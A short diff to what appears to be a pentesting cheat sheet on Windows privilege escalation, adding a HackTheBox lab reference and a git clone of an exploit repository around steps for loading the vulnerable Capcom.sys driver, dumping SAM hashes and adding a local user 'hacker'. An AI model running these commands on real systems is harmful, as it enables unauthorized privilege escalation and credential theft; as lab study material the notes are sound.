@@ -1477,6 +1477,7 @@ secretsdump.py -sam sam -system system LOCAL
 ```powershell
 # Load a malicious (or vulnerable signed) kernel driver
 # CVE-2019-16098: RTCore64.sys — allows arbitrary memory read/write from user-mode
+# there is lab called fuse in hackthebox labs
 
 # Using Capcom.sys (signed vulnerable driver) — BYOVD technique
 SeLoadDriverPrivilege.exe                  # Enable the privilege
@@ -1486,6 +1487,10 @@ capcom_exploit.exe cmd.exe /c net user hacker P@ss /add   # Execute via driver
 **
 SeLoadDriverPrivilege
 1- enable the service if disabled with https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+
+```bash
+git clone https://github.com/rednexusacademy/SeLoadDriverPrivilege.git
+```
 - add tge Capcom.sys in C:\Users\Public\Desktop\Capcom.sys
 2- add vulnerable driver to registry
 ```text
